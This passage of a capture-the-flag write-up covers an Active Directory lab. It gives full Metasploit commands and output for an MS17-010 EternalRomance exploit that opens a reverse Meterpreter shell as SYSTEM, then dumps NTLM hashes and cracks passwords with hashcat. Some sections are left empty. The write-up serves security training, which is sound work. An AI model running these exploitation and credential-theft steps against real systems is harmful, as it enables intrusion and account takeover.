	WebService                                        	READ, WRITE	Web service file share for company
```

From this output, user `ali` only have pemission to write on folder `WebService`.

**Answer: WebService**

### Q3 - NTLM hash result for user Administrator

![](/images/ctf-round-3-active-directory/17.png)

As I know this host ran SMB service, it could be vulnerable to MS17-010 or not. To verify it, I ran `msfconsole` and used `auxiliary/scanner/smb/smb_ms17_010`. This scanner will detect either the host is vulnerable or not.

```
$ msfconsole

msf6> use auxiliary/scanner/smb/smb_ms17_010
msf6 auxiliary(scanner/smb/smb_ms17_010) > set RHOSTS 192.168.240.13
RHOSTS => 192.168.240.13
msf6 auxiliary(scanner/smb/smb_ms17_010) > set SMBDomain MYCOMS
SMBDomain => MYCOMS
msf6 auxiliary(scanner/smb/smb_ms17_010) > set SMBUser ali
SMBUser => ali
msf6 auxiliary(scanner/smb/smb_ms17_010) > set SMBPass P@ssw0rd123!
SMBPass => P@ssw0rd123!
msf6 auxiliary(scanner/smb/smb_ms17_010) > run

[+] 192.168.240.13:445    - Host is likely VULNERABLE to MS17-010! - Windows Server 2012 R2 Standard Evaluation 9600 x64 (64-bit)
[*] 192.168.240.13:445    - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

Yep, it's vulnerable to MS17-010. This will give me 2 choices:

* MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
* MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution

`nmap` suggested that this host is Windows 2008 R2 - 2012. EternalBlue can be use against Windows 7 and Windows Server 2008 R2 while EternalRomance works on all OS's up to Windows Server 2016. In this case, I used EternalRomance.

```
msf6 auxiliary(scanner/smb/smb_ms17_010) > use exploit/windows/smb/ms17_010_psexec
msf6 exploit(windows/smb/ms17_010_psexec) > set RHOSTS 192.168.240.13
RHOSTS => 192.168.240.13
msf6 exploit(windows/smb/ms17_010_psexec) > set SERVICE_NAME godek2
SERVICE_NAME => godek2
msf6 exploit(windows/smb/ms17_010_psexec) > set SMBDomain MYCOMS
SMBDomain => MYCOMS
msf6 exploit(windows/smb/ms17_010_psexec) > set SMBUser ali
SMBUser => ali
msf6 exploit(windows/smb/ms17_010_psexec) > set SMBPass P@ssw0rd123!
SMBPass => P@ssw0rd123!
msf6 exploit(windows/smb/ms17_010_psexec) > set LHOST 10.0.200.2
LHOST => 10.0.200.2
msf6 exploit(windows/smb/ms17_010_psexec) > exploit

[*] Started reverse TCP handler on 10.0.200.2:4444 
[*] 192.168.240.13:445 - Authenticating to 192.168.240.13 as user 'ali'...
[*] 192.168.240.13:445 - Target OS: Windows Server 2012 R2 Standard Evaluation 9600
[*] 192.168.240.13:445 - Built a write-what-where primitive...
[+] 192.168.240.13:445 - Overwrite complete... SYSTEM session obtained!
[*] 192.168.240.13:445 - Selecting PowerShell target
[*] 192.168.240.13:445 - Executing the payload...
[+] 192.168.240.13:445 - Service start timed out, OK if running a command or non-service executable...
[*] Sending stage (175174 bytes) to 192.168.240.13
[*] Meterpreter session 1 opened (10.0.200.2:4444 -> 192.168.240.13:49750) at 2020-11-26 23:31:47 +0800

meterpreter >
```

Now I'm inside. Firstly, I need to check what user I'm.

```
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

I'm as `SYSTEM`. To get the Administrator's NTLM hash, I used `post/windows/gather/smart_hashdump`, like the previous challenge.

```
meterpreter > background
[*] Backgrounding session 1...
msf6 exploit(windows/smb/ms17_010_psexec) > use post/windows/gather/smart_hashdump
msf6 post(windows/gather/smart_hashdump) > set SESSION 1
SESSION => 1
msf6 post(windows/gather/smart_hashdump) > run

[*] Running module against PROD-FSRV5633
[*] Hashes will be saved to the database if one is connected.
[+] Hashes will be saved in loot in JtR password file format to:
[*] /home/ahmad/.msf4/loot/20201126233811_default_192.168.240.13_windows.hashes_939066.txt
[*] Dumping password hashes...
[*] Running as SYSTEM extracting hashes from registry
[*] 	Obtaining the boot key...
[*] 	Calculating the hboot key using SYSKEY 0790a788d7c5ef20cb80b176f62f2123...
[*] 	Obtaining the user list and keys...
[*] 	Decrypting user keys...
[*] 	Dumping password hints...
[*] 	No users with password hints on this system
[*] 	Dumping password hashes...
[+] 	Administrator:500:aad3b435b51404eeaad3b435b51404ee:1df71c58e95017fb35169f71a06112f4:::
[+] 	umar:1002:aad3b435b51404eeaad3b435b51404ee:690202604d171a54bc7d7d06aa90df3f:::
[*] Post module execution completed
```

Now that I have the NTLM hash.

**Answer: Administrator:500:aad3b435b51404eeaad3b435b51404ee:1df71c58e95017fb35169f71a06112f4:::**

### Q4 - NTLM hash result for user "*mar"

![](/images/ctf-round-3-active-directory/18.png)

Grab the user `umar` NTLM hash from the smart hashdump output.

**Answer: umar:1002:aad3b435b51404eeaad3b435b51404ee:690202604d171a54bc7d7d06aa90df3f:::**

### Q5 - Plain text password for user Administrator

![](/images/ctf-round-3-active-directory/19.png)

I've given a hint `P@ssw0rd?a?a?a?a?a?a` which means I only have partial of the plaintext password. In this case, I did mask attack using `Hashcat`. This attack will guess the password via brute forcing.

```
$ hashcat -m 1000 -a 3 1df71c58e95017fb35169f71a06112f4 'P@ssw0rd?a?a?a?a?a?a'
hashcat (v6.1.1) starting...

OpenCL API (OpenCL 1.2 pocl 1.5, None+Asserts, LLVM 9.0.1, RELOC, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
=============================================================================================================================
* Device #1: pthread-AMD Ryzen 3 2200G with Radeon Vega Graphics, 2890/2954 MB (1024 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates

Applicable optimizers applied:
* Zero-Byte
* Early-Skip
* Not-Salted
* Not-Iterated
* Single-Hash
* Single-Salt
* Brute-Force
* Raw-Hash

ATTENTION! Pure (unoptimized) backend kernels selected.
Using pure kernels enables cracking longer passwords but for the price of drastically reduced performance.
If you want to switch to optimized backend kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

Host memory required for this attack: 65 MB

1df71c58e95017fb35169f71a06112f4:P@ssw0rd123!!!  
                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Name........: NTLM
Hash.Target......: 1df71c58e95017fb35169f71a06112f4
Time.Started.....: Thu Nov 26 23:48:12 2020 (3 secs)
Time.Estimated...: Thu Nov 26 23:48:15 2020 (0 secs)
Guess.Mask.......: P@ssw0rd?a?a?a?a?a?a [14]
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  3443.3 kH/s (0.32ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests
Progress.........: 11149312/735091890625 (0.00%)
Rejected.........: 0/11149312 (0.00%)
Restore.Point....: 11145216/735091890625 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#1....: P@ssw0rds[~+++ -> P@ssw0rd8fe234

Started: Thu Nov 26 23:47:30 2020
Stopped: Thu Nov 26 23:48:17 2020
```

**Answer: P@ssw0rd123!!!**

## Challenges - Domain Controller

### Q1 - NTLM hash result for user Administrator

![](/images/ctf-round-3-active-directory/20.png)

I looked into the host's ARP cache using `arp`.

```
meterpreter > arp

ARP cache
=========

    IP address       MAC address        Interface
    ----------       -----------        ---------
    192.168.240.1    00:0c:29:4c:f2:d9  12
    192.168.240.30   00:0c:29:3b:05:22  12
    192.168.240.255  ff:ff:ff:ff:ff:ff  12
    224.0.0.22       00:00:00:00:00:00  1
    224.0.0.22       01:00:5e:00:00:16  12
    224.0.0.252      01:00:5e:00:00:fc  12
```

I suspected that IP address `192.168.240.30` is the domain controller. This IP address also found in the ARP cache of webserver on `192.168.240.80`.

To verify it, I ran `nmap` on the IP.

```
$ nmap -Pn 192.168.240.30
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2020-11-27 00:04 +08
Nmap scan report for 192.168.240.30
Host is up (0.058s latency).
Not shown: 996 filtered ports
PORT     STATE SERVICE
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3389/tcp open  ms-wbt-server
```

Domain controller commonly have these ports. I found 2 tools that I can use for getting the shell, `smbexec` and `psexec`. I used `psexec` because Metasploit has a module of it. So, I can easily spawn meterpreter from it. I also have the NTLM hash for one of the domain admin, `umar`. Firstly, I need to check what share folder that domain admin `umar` can access.

```

```

### Q2 - NTLM hash result for Enterprise admin user

![](/images/ctf-round-3-active-directory/21.png)



### Q3 - Bonus - Plain text password for Domain admin user

![](/images/ctf-round-3-active-directory/22.png)

Grab that NTLM hash for domain admin user `abu` into hashcat. I used Google Colab to bruteforce the plaintext password. I also modified the hint so that the time required for brute forcing became lesser.

```
$ hashcat -m 1000 -a 3 7670e8dd99bbdc594089db1c33844092 '?u?a?a?a?a?a?aP@ssw0rd123!'

hashcat (v4.0.1) starting...

nvmlDeviceGetFanSpeed(): Not Supported

OpenCL Platform #1: NVIDIA Corporation
======================================
* Device #1: Tesla T4, 3769/15079 MB allocatable, 40MCU

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates

Applicable optimizers:
* Zero-Byte
* Early-Skip
* Not-Salted
* Not-Iterated
* Single-Hash
* Single-Salt
* Brute-Force
* Raw-Hash

Password length minimum: 0
Password length maximum: 256

ATTENTION! Pure (unoptimized) OpenCL kernels selected.
This enables cracking passwords and salts > length 32 but for the price of drastical reduced performance.
If you want to switch to optimized OpenCL kernels, append -O to your commandline.

Watchdog: Temperature abort trigger set to 90c
Watchdog: Temperature retain trigger disabled.

* Device #1: build_opts '-I /usr/share/hashcat/OpenCL -D VENDOR_ID=32 -D CUDA_ARCH=705 -D AMD_ROCM=0 -D VECT_SIZE=1 -D DEVICE_TYPE=4 -D DGST_R0=0 -D DGST_R1=3 -D DGST_R2=2 -D DGST_R3=1 -D DGST_ELEM=4 -D KERN_TYPE=1000 -D _unroll'
- Device #1: autotuned kernel-accel to 128
- Device #1: autotuned kernel-loops to 128
Cracking performance lower than expected?

* Append -O to the commandline.
  This lowers the maximum supported password- and salt-length (typically down to 32).

* Append -w 3 to the commandline.
  This can cause your screen to lag.

* Update your OpenCL runtime / driver the right way:
  https://hashcat.net/faq/wrongdriver

* Create more work items to make use of your parallelization power:
  https://hashcat.net/faq/morework

[s]tatus [p]ause [r]esume [b]ypass [c]heckpoint [q]uit =>

7670e8dd99bbdc594089db1c33844092:SecuredP@ssw0rd123!
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Type........: NTLM
Hash.Target......: 7670e8dd99bbdc594089db1c33844092
Time.Started.....: Sun Nov 29 21:54:41 2020 (3 mins, 19 secs)
Time.Estimated...: Sun Nov 29 21:58:00 2020 (0 secs)
Guess.Mask.......: ?u?a?a?a?a?a?aP@ssw0rd123! [19]
Guess.Queue......: 1/1 (100.00%)
Speed.Dev.#1.....:  9975.1 MH/s (1.86ms)
Recovered........: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts
Progress.........: 2003651788800/19112389156250 (10.48%)
Rejected.........: 0/2003651788800 (0.00%)
Restore.Point....: 8519680/81450625 (10.46%)
Candidates.#1....: NUE)m%6P@ssw0rd123! -> Kyoqd2kP@ssw0rd123!
HWMon.Dev.#1.....: Temp: 77c Util: 90% Core:1155MHz Mem:5000MHz Bus:16

Started: Sun Nov 29 21:54:37 2020
Stopped: Sun Nov 29 21:58:02 2020
```

**Answer: SecuredP@ssw0rd123!**